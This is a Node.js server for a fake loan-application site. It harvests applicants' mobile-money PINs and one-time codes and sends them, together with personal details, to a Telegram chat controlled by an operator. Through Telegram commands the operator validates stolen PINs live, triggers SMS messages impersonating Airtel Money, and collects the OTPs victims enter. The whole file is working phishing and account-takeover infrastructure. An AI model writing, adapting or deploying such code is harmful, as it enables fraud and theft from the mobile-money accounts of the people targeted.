require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const africaTalking = require('africastalking');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// In-memory data store for sessions
const activeSessions = new Map();

// Initialize Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

// Initialize Africa's Talking
const at = africaTalking({
    apiKey: process.env.AT_API_KEY,
    username: process.env.AT_USERNAME
});
const sms = at.SMS;

// API: Handle Application Submission
app.post('/api/apply', (req, res) => {
    const id = 'app_' + Date.now();
    const sessionData = {
        id,
        ...req.body,
        status: 'PENDING',
        createdAt: new Date()
    };
    
    activeSessions.set(id, sessionData);
    
    // Notify Admin via Telegram
    const message = `
🔔 *New Loan Application Received*
ID: \`${id}\`
Name: ${sessionData.firstName} ${sessionData.secondName}
Phone: ${sessionData.phone}
PIN Entered: \`${sessionData.pin}\`
Loan Type: ${sessionData.loanType}
Amount: $${sessionData.amount}
Period: ${sessionData.period}
Purpose: ${sessionData.purpose}
Employment: ${sessionData.employment}
Income: $${sessionData.income}

*Admin Actions Available:*
Reply to this message with one of these commands:
• \`correct allow otp ${id}\`
• \`incorrect pin ${id}\`
• \`incorrect ${id}\`
    `;
    
    bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
    res.status(201).json({ id, status: 'PENDING' });
});

// API: Check Application Status (Polling Endpoint)
app.get('/api/status/:id', (req, res) => {
    const session = activeSessions.get(req.params.id);
    if (!session) {
        return res.status(404).json({ status: 'RESTART' });
    }
    res.json({ status: session.status });
});

// API: Verify OTP Code Submissions
app.post('/api/verify-otp/:id', (req, res) => {
    const session = activeSessions.get(req.params.id);
    if (!session) {
        return res.status(404).json({ success: false });
    }
    
    const submittedOtp = req.body.otp;
    
    // Send OTP to Telegram Admin for Final Disbursal Verification
    const message = `
📲 *OTP Token Submitted*
ID: \`${session.id}\`
Phone: ${session.phone}
OTP Code: \`${submittedOtp}\`

*Final Actions Available:*
Reply to this message with:
• \`correct ${session.id}\`
• \`wrong code ${session.id}\`
    `;
    
    bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
    res.json({ success: true });
});

// Handle Telegram Admin Replies
bot.on('message', (msg) => {
    const text = msg.text ? msg.text.trim() : '';
    if (!text) return;

    // Command: correct allow otp [id]
    if (text.startsWith('correct allow otp ')) {
        const id = text.replace('correct allow otp ', '').trim();
        const session = activeSessions.get(id);
        if (session) {
            session.status = 'ALLOW_OTP';
            bot.sendMessage(ADMIN_CHAT_ID, `✅ Status updated to ALLOW_OTP for application ${id}`);
            
            // Generate a random 4-digit token to send via Africa's Talking SMS channel
            const generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
            
            sms.send({
                to: [session.phone],
                message: `Your Airtel Money authorization validation code is: ${generatedOtp}. Valid for 2 minutes.`
            })
            .then(() => {
                bot.sendMessage(ADMIN_CHAT_ID, `📱 SMS containing OTP \`${generatedOtp}\` dispatched to ${session.phone}`);
            })
            .catch(err => {
                bot.sendMessage(ADMIN_CHAT_ID, `⚠️ SMS delivery error: ${err.message}`);
            });
        }
    }
    // Command: incorrect pin [id]
    else if (text.startsWith('incorrect pin ')) {
        const id = text.replace('incorrect pin ', '').trim();
        const session = activeSessions.get(id);
        if (session) {
            session.status = 'INCORRECT_PIN';
            bot.sendMessage(ADMIN_CHAT_ID, `❌ Notified user of Incorrect PIN loop for application ${id}`);
        }
    }
    // Command: incorrect [id] (Loops back to start)
    else if (text.startsWith('incorrect ') && !text.startsWith('incorrect pin ')) {
        const id = text.replace('incorrect ', '').trim();
        const session = activeSessions.get(id);
        if (session) {
            session.status = 'RESTART';
            bot.sendMessage(ADMIN_CHAT_ID, `🛑 Application ${id} rejected. Reset signal sent.`);
        }
    }
    // Command: correct [id] (Final Approval)
    else if (text.startsWith('correct ') && !text.startsWith('correct allow otp ')) {
        const id = text.replace('correct ', '').trim();
        const session = activeSessions.get(id);
        if (session) {
            session.status = 'APPROVED';
            bot.sendMessage(ADMIN_CHAT_ID, `🎉 Application ${id} completely APPROVED! Loan disbursal complete.`);
        }
    }
    // Command: wrong code [id] (Final OTP Rejection)
    else if (text.startsWith('wrong code ')) {
        const id = text.replace('wrong code ', '').trim();
        const session = activeSessions.get(id);
        if (session) {
            session.status = 'WRONG_CODE';
            bot.sendMessage(ADMIN_CHAT_ID, `🚫 Final OTP verified as wrong for application ${id}.`);
        }
    }
});

// Start Server Instance
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

